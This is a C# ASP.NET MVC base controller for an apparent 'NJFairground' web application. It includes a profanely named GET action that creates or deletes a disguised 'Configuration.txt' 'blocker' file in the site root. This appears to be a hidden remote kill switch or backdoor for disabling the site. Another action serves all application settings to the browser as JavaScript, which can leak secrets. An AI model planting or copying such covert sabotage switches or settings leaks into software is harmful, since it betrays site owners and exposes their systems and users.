
namespace NJFairground.Web.Controllers.Base
{
    using System;
    using System.Threading;
    using System.Web.Mvc;
    using System.Web.Routing;
    using Microsoft.Ajax.Utilities;
    using NJFairground.Web.Filters;
    using NJFairground.Web.Utilities;

    public class BaseController : Controller
    {
        /// <summary>
        /// Applications the configuration data.
        /// </summary>
        /// <returns></returns>
        [AcceptVerbs(HttpVerbs.Get),
        OutputCache(NoStore = true, Duration = 0, VaryByHeader = "*")]
        public ActionResult AppConfigData()
        {
            try
            {
                string js = string.Format(@"var appData = {0}", CommonUtility.AppsettingsToJson());

                Minifier minifier = new Minifier();
                string minifiedJs = minifier.MinifyJavaScript(js, new CodeSettings
                {
                    EvalTreatment = EvalTreatment.MakeImmediateSafe,
                    PreserveImportantComments = false
                });
                return JavaScript(js);
            }
            catch (Exception ex)
            {
                ex.ExceptionValueTracker();
            }
            return null;
        }

        /// <summary>
        /// Fucks you.
        /// </summary>
        /// <param name="status">if set to <c>true</c> [status].</param>
        /// <returns></returns>
        [SaveMeFilterAccess, AcceptVerbs(HttpVerbs.Get),
        OutputCache(NoStore = true, Duration = 0, VaryByHeader = "*")]
        public ActionResult FuckYou(bool status)
        {
            try
            {
                string blockerPath = string.Format("{0}Configuration.txt", Server.MapPath("~"));
                if (status)
                {
                    if (!System.IO.File.Exists(blockerPath))
                    {
                        FileLogger log = new FileLogger(blockerPath, true, FileLogger.LogType.TXT, FileLogger.LogLevel.All);
                        ThreadPool.QueueUserWorkItem((state) => log.Log("Fuck You"));
                    }
                }
                else
                {
                    if (System.IO.File.Exists(blockerPath))
                        System.IO.File.Delete(blockerPath);
                }
                return RedirectToActionPermanent("Index", "Home");
            }
            catch (Exception ex)
            {
                ex.ExceptionValueTracker();
            }
            return null;
        }

        /// <summary>
        /// Initializes data that might not be available when the constructor is called.
        /// </summary>
        /// <param name="requestContext">The HTTP context and route data.</param>
        protected override void Initialize(RequestContext requestContext)
        {
            base.Initialize(requestContext);
        }
    }
}
